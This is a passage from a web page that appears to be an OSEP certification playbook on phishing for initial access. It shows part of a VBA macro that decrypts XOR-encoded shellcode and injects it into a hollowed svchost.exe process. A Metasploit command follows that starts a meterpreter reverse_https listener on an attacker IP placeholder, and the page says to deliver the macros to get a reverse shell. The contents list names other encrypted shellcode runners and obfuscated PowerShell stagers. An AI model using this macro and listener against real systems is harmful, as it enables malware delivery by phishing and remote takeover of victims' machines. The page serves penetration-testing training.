style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Decrypt shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As </span><span class="token class-name">Byte</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    keyArrayTemp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">Xor</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">keyArrayTemp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Mod </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next x</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; TODO </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> the </span><span class="token return-type class-name">SIZE</span><span class="token plain"> here </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">use a size </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> to the </span><span class="token class-name">shellcode</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">Dim</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">685</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Byte</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> y </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">y</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Write the shellcode </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> the svchost</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe entry </span><span class="token class-name">point</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    a </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ProcInfo</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addressOfEntryPoint</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> scSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Resume svchost</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe process to run the </span><span class="token class-name">shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    b </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ResumeThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pi</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your Metasploit listener</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> msfconsole </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Deliver your Macros</strong> and wait for execution and your reverse shell</li>
</ol></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Send Emails Commands</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/OSEP-Playbook/docs/osep/initial-access/phishing/JScript"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">JScript</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#callback-pinging" class="table-of-contents__link toc-highlight"><strong>Callback Pinging</strong></a></li><li><a href="#determine-target-architecture" class="table-of-contents__link toc-highlight"><strong>Determine Target Architecture</strong></a></li><li><a href="#shellcode-runner---meterpreter-encrypted" class="table-of-contents__link toc-highlight"><strong>Shellcode Runner - Meterpreter Encrypted</strong></a></li><li><a href="#shellcode-runner---c-vba-encrypted" class="table-of-contents__link toc-highlight"><strong>Shellcode Runner - C# VBA Encrypted</strong></a></li><li><a href="#powershell-stager---encrypted--obfuscated" class="table-of-contents__link toc-highlight"><strong>PowerShell Stager - Encrypted &amp; Obfuscated</strong></a></li><li><a href="#powershell-stager---unencrypted" class="table-of-contents__link toc-highlight"><strong>PowerShell Stager - Unencrypted</strong></a></li><li><a href="#process-injection---meterpreter-encrypted" class="table-of-contents__link toc-highlight"><strong>Process Injection - Meterpreter Encrypted</strong></a></li><li><a href="#process-hollow---meterpreter-encrypted" class="table-of-contents__link toc-highlight"><strong>Process Hollow - Meterpreter Encrypted</strong></a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>